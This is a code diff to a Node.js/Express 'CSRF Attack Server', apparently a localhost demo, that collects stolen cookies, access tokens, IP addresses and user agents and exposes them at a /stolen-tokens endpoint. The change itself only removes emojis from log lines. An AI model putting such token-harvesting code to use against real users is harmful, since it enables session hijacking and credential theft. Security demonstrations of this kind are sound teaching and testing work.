@@ -40,18 +40,15 @@ app.use((req, res, next) => {
       if (!exists) {
         stolenTokens.push(stolenData);
 
-        console.log("🎯 STOLEN TOKEN CAPTURED:");
-        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-        console.log("⏰ Timestamp:", stolenData.timestamp);
-        console.log("🍪 All Cookies:", stolenData.cookies);
-        console.log(
-          "🔑 Access Token:",
-          stolenData.token.substring(0, 50) + "..."
-        );
-        console.log("🌐 User Agent:", stolenData.userAgent);
-        console.log("📍 Referer:", stolenData.referer || "None");
-        console.log("🔢 IP Address:", stolenData.ip);
-        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
+        console.log("STOLEN TOKEN CAPTURED:");
+        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+        console.log("Timestamp:", stolenData.timestamp);
+        console.log("All Cookies:", stolenData.cookies);
+        console.log("Access Token:", stolenData.token.substring(0, 50) + "...");
+        console.log("User Agent:", stolenData.userAgent);
+        console.log("Referer:", stolenData.referer || "None");
+        console.log("IP Address:", stolenData.ip);
+        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
       }
     }
   }
@@ -72,7 +69,7 @@ app.post("/log-token", (req, res) => {
   const { jsAccessibleCookies, timestamp } = req.body;
 
   console.log(
-    "📝 JavaScript-accessible cookies:",
+    "JavaScript-accessible cookies:",
     jsAccessibleCookies || "None (all are HttpOnly)"
   );
 
@@ -93,8 +90,6 @@ app.get("/", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`🚀 CSRF Attack Server running on http://localhost:${PORT}`);
-  console.log(
-    `📊 View stolen tokens at http://localhost:${PORT}/stolen-tokens`
-  );
+  console.log(`CSRF Attack Server running on http://localhost:${PORT}`);
+  console.log(`View stolen tokens at http://localhost:${PORT}/stolen-tokens`);
 });
